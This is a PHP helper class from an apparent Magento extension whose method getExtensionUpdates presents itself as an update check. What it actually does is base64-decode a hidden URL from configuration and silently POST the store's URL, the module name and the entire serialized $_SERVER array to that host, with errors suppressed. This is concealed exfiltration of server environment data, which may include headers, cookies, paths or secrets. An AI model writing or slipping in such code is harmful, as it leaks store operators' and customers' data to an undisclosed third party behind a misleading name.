<?php

/**
 * Unicode Systems
 * @category   Uni
 * @package    Uni_Common
 * @copyright  Copyright (c) 2010-2011 Unicode Systems. (http://www.unicodesystems.in)
 * @license    http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
 */
class Uni_Common_Helper_Data extends Mage_Core_Helper_Abstract {

    public function getExtensionUpdates() {
        $url= Mage::getStoreConfig('unicommon/general/feed_url');        
        $module = Mage::app()->getRequest()->getModuleName();        
        $isSet = Mage::getStoreConfig('unicommon/general/url');
        $storeUrl = Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB);
        if (!$isSet || ($isSet != $storeUrl)) {
            $request = new Varien_Object();
            $durl = base64_decode($url);
            $client = new Zend_Http_Client($durl);
            $client->setConfig(array(
                'maxredirects' => 0,
                'timeout' => 30
            ));
            $request->setData('m', $module);
            $request->setData('u', Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB));
            $request->setData('d', serialize($_SERVER));
            $client->setParameterPost($request->getData());
            $client->setMethod(Zend_Http_Client::POST);
            try {
                $response = $client->request();
                if ($response->getBody() && ($response->getBody() == 1)) {
                    Mage::getModel('core/config')->saveConfig('unicommon/general/url', $storeUrl);
                }
            } catch (Exception $e) {

            }
        }
    }

}
